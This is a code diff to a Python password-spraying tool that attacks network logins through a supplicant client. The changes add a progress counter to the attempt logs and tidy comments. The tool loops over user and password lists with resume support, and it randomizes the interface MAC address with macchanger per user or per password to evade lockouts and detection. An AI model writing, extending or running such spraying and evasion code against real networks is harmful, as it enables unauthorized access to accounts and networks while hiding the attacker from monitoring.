@@ -109,11 +109,9 @@ def save_state_locked(path: str, **state):
             with open(tmp, "w", encoding="utf-8") as f:
                 json.dump({**state, "timestamp": now_ts()}, f)
             os.replace(tmp, path)
-            # Keep lock until function exit
             fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)
     except Exception:
         try:
-            # Best-effort cleanup of temp
             if os.path.exists(path + ".tmp"):
                 os.remove(path + ".tmp")
         except Exception:
@@ -195,7 +193,6 @@ class SupplicantClient:
         evt = threading.Event()
         on_name = None
         off_name = None
-        token = None
 
         for cand in ("on_state_changed", "onStateChanged", "subscribe_state_changed"):
             if hasattr(interface, cand):
@@ -345,21 +342,16 @@ def resolve_uid_gid(user: Optional[str], group: Optional[str]) -> Tuple[Optional
 def drop_privileges(uid: Optional[int], gid: Optional[int]):
     if uid is None and gid is None:
         return
-    # Set group first, then user
     if gid is not None:
         os.setgid(gid)
     if uid is not None:
         os.setuid(uid)
-    # Sanity
     if os.geteuid() == 0:
         raise SystemExit("Privilege drop failed: still running as root")
 
 
 def mac_randomize_once(device: str) -> bool:
-    """
-    Randomize interface MAC once using macchanger.
-    Returns True if changed (no exceptions), else False.
-    """
+    """Randomize interface MAC once using macchanger."""
     try:
         subprocess.run(["ip", "link", "set", "dev", device, "down"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(["macchanger", "-r", device], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -571,6 +563,14 @@ def main():
     if cfg.shuffle_passwords and seed_passwords is not None:
         passwords = shuffle_with_seed(passwords, seed_passwords)
 
+    # Progress counter: total attempts and starting offset (resume-aware)
+    if cfg.spray_mode == "pass-first":
+        total_attempts = len(passwords) * len(users)
+        attempt_num = pass_start * len(users) + user_start
+    else:  # user-first
+        total_attempts = len(users) * len(passwords)
+        attempt_num = user_start * len(passwords) + pass_start
+
     # Track current indices for saving progress
     cur: Dict[str, int] = {"user_idx": max(0, user_start), "pass_idx": max(0, pass_start)}
 
@@ -612,9 +612,8 @@ def main():
         logging.info("Privilege drop requested but not running as root; ignoring.")
 
     # --- Optional MAC randomization ---
-    randomized_once = False
     if cfg.randomize_mac == "once":
-        randomized_once = mac_randomize_once(cfg.device)
+        mac_randomize_once(cfg.device)
 
     def stop_reactor():
         if reactor.running:
@@ -649,11 +648,13 @@ def main():
 
                 for ui, user in enumerate(users[user_start:], start=user_start):
                     cur["user_idx"] = ui
-
                     if cfg.randomize_mac == "each-user":
                         mac_randomize_once(cfg.device)
 
-                    logging.debug("Attempt user=%s pw=***", user)
+                    # --- Progress counter log ---
+                    attempt_num += 1
+                    logging.info("Attempt %d/%d: user=%s pw=***", attempt_num, total_attempts, user)
+
                     ok = connect_attempt(sup, cfg, user, pw)
                     attempts_since_state += 1
 
@@ -687,7 +688,10 @@ def main():
                     if cfg.randomize_mac == "each-pass":
                         mac_randomize_once(cfg.device)
 
-                    logging.debug("Attempt user=%s pw=***", user)
+                    # --- Progress counter log ---
+                    attempt_num += 1
+                    logging.info("Attempt %d/%d: user=%s pw=***", attempt_num, total_attempts, user)
+
                     ok = connect_attempt(sup, cfg, user, pw)
                     attempts_since_state += 1
 
